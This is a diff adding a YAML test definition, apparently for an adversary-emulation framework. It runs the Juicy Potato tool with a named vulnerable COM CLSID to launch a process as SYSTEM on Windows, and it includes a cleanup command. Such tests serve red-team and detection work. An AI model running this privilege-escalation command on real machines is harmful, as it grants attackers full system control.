@@ -1,0 +1,24 @@
+---
+- id: 9a4cc90aee89da89e3f907e13140de2c
+  name: Juicy Potato
+  description: "This Atomic utilizes Juicy Potato to obtain privilege escalation.\
+    \ \nUpon successful execution of this test, a vulnerable CLSID will be used to\
+    \ execute a process with system permissions.\nThis tactic has been previously\
+    \ observed in SnapMC Ransomware, amongst numerous other campaigns. \n[Reference](https://blog.fox-it.com/2021/10/11/snapmc-skips-ransomware-steals-data/)"
+  tactic: multiple
+  technique:
+    attack_id: T1134.001
+    name: 'Access Token Manipulation: Token Impersonation/Theft'
+  platforms:
+    windows:
+      psh:
+        command: cmd /c 'PathToAtomicsFolder\..\ExternalPayloads\JuicyPotato.exe'
+          -l '7777' -t * -p '$env:windir\system32\notepad.exe' -c '{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}'
+        payloads: []
+        cleanup: get-ciminstance Win32_Process | where-object { $_.Path -eq "$env:windir\system32\notepad.exe"
+          } | invoke-cimmethod -methodname "terminate" | out-null; get-ciminstance
+          Win32_Process | where-object { $_.Path -eq "PathToAtomicsFolder\..\ExternalPayloads\JuicyPotato.exe"
+          } | invoke-cimmethod -methodname "terminate" | out-null
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
